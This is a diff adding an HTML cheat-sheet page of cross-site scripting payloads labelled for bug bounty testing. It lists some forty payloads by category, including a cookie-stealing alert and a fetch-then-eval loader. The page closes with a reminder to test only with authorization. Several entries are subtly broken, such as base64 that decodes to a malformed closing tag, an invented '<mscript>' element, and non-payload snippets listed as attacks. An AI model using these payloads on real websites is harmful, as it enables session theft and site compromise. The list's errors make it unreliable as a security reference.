@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Payloads for Bug Bounty</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f1f2f5;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            max-width: 800px;
+            margin: auto;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            padding: 20px;
+        }
+        h1 {
+            color: #3b5998;
+            text-align: center;
+        }
+        h2 {
+            color: #333;
+        }
+        pre {
+            background: #f7f7f7;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            padding: 10px;
+            overflow: auto;
+        }
+        .tip {
+            background-color: #e7f3fe;
+            border-left: 6px solid #2196F3;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>XSS Payloads for Bug Bounty</h1>
+        
+        <h2>Common XSS Payloads</h2>
+        <pre>&lt;script&gt;alert('XSS')&lt;/script&gt;</pre>
+        <pre>&lt;img src=x onerror=alert('XSS')&gt;</pre>
+        <pre>&lt;div onmouseover="alert('XSS')"&gt;Hover me!&lt;/div&gt;</pre>
+        <pre>&lt;a href="javascript:alert('XSS')"&gt;Click me!&lt;/a&gt;</pre>
+        <pre>&lt;svg&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/svg&gt;</pre>
+        <pre>&lt;iframe src="javascript:alert('XSS')"&gt;&lt;/iframe&gt;</pre>
+        <pre>&lt;body onload=alert('XSS')&gt;</pre>
+        <pre>&lt;input value="x" onfocus="alert('XSS')"&gt;</pre>
+        <pre>&lt;video src="invalid.mp4" onerror="alert('XSS')"&gt;&lt;/video&gt;</pre>
+        <pre>&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</pre>
+
+        <h2>Encoded Payloads</h2>
+        <pre>&amp;lt;script&amp;gt;alert('XSS')&amp;lt;/script&amp;gt;</pre>
+        <pre>%3Cscript%3Ealert('XSS')%3C/script%3E</pre>
+        <pre>&amp;gt;&lt;img src=x onerror=alert(&#39;XSS&#39;)&gt;</pre>
+        <pre>&lt;meta http-equiv="refresh" content="0;url=javascript:alert('XSS')"&gt;</pre>
+        
+        <h2>Event-Based Payloads</h2>
+        <pre>&lt;button onclick="alert('XSS')"&gt;Click Me!&lt;/button&gt;</pre>
+        <pre>&lt;a href="#" onmouseover="alert('XSS')"&gt;Hover Me!&lt;/a&gt;</pre>
+        <pre>&lt;input onkeyup="alert('XSS')"&gt;</pre>
+        <pre>&lt;form action="javascript:alert('XSS')"&gt;&lt;/form&gt;</pre>
+        
+        <h2>Framework-Specific Payloads</h2>
+        <pre>{{alert('XSS')}}</pre>
+        <pre>&lt;div v-html="unsafeHtml"&gt;&lt;/div&gt;</pre>
+        <pre>&lt;div :innerHTML="payload"&gt;&lt;/div&gt;</pre>
+        
+        <h2>JavaScript Execution Payloads</h2>
+        <pre>&lt;script&gt;document.documentElement.innerHTML='&lt;img src=x onerror=alert(1)&gt;';&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;window['alert']('XSS');&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;fetch('data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=')&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;eval('alert(1)')&lt;/script&gt;</pre>
+
+        <h2>Complex Payloads</h2>
+        <pre>&lt;script&gt;document.location='javascript:alert(1)';&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;fetch('x').then(response =&gt; response.text()).then((text) =&gt; eval(text));&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;setTimeout('alert(1)', 1000);&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;document.write('&lt;img src=x onerror=alert(1)&gt;');&lt;/script&gt;</pre>
+
+        <h2>CSS and Other Techniques</h2>
+        <pre>&lt;style&gt;@import'javascript:alert(1)';&lt;/style&gt;</pre>
+        <pre>&lt;link rel="stylesheet" href="javascript:alert(1)"&gt;</pre>
+        <pre>&lt;style&gt;body{background:url(javascript:alert(1));}&lt;/style&gt;</pre>
+
+        <h2>Miscellaneous Payloads</h2>
+        <pre>&lt;meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvZz4="&gt;</pre>
+        <pre>&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvZz4="&gt;&lt;/object&gt;</pre>
+        <pre>&lt;iframe src="javascript:document.body.innerHTML='&lt;script&gt;alert(1)&lt;/script&gt;'"&gt;&lt;/iframe&gt;</pre>
+        <pre>&lt;body background="javascript:alert('XSS')"&gt;</pre>
+        
+        <h2>HTML Injection Payloads</h2>
+        <pre>&lt;details ontoggle="alert('XSS')"&gt;&lt;summary&gt;Details&lt;/summary&gt;&lt;/details&gt;</pre>
+        <pre>&lt;marquee onstart="alert('XSS')"&gt;Scrolling Text&lt;/marquee&gt;</pre>
+        <pre>&lt;script src="data:text/javascript,alert(1)">&lt;/script&gt;</pre>
+        
+        <h2>Diverse Techniques</h2>
+        <pre>&lt;math&gt;&lt;mscript&gt;alert('XSS');&lt;/mscript&gt;&lt;/math&gt;</pre>
+        <pre>&lt;canvas id="c"&gt;&lt;/canvas&gt;&lt;script&gt;var c=document.getElementById("c");var ctx=c.getContext("2d");ctx.fillText("XSS",10,50);&lt;/script&gt;</pre>
+        <pre>&lt;input type="text" value="x" onfocus="alert('XSS')"&gt;</pre>
+        
+        <h2>DOM-Based Payloads</h2>
+        <pre>&lt;a href="#" onclick="document.body.innerHTML='&lt;script&gt;alert(1)&lt;/script&gt;'"&gt;Inject XSS&lt;/a&gt;</pre>
+        <pre>&lt;button onclick="this.parentNode.innerHTML='&lt;script&gt;alert(1)&lt;/script&gt;'"&gt;Inject Script&lt;/button&gt;</pre>
+
+        <h2>Special Character Payloads</h2>
+        <pre>&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</pre>
+        <pre>&lt;script&gt;alert(String.fromCharCode(88)+String.fromCharCode(83)+String.fromCharCode(83))&lt;/script&gt;</pre>
+
+        <div class="tip">
+            <strong>Important Note:</strong><br>
+            Always conduct testing responsibly and within guidelines established by bug bounty programs.
+            Unauthorized testing is illegal and unethical.
+        </div>
+    </div>
+</body>
+</html>
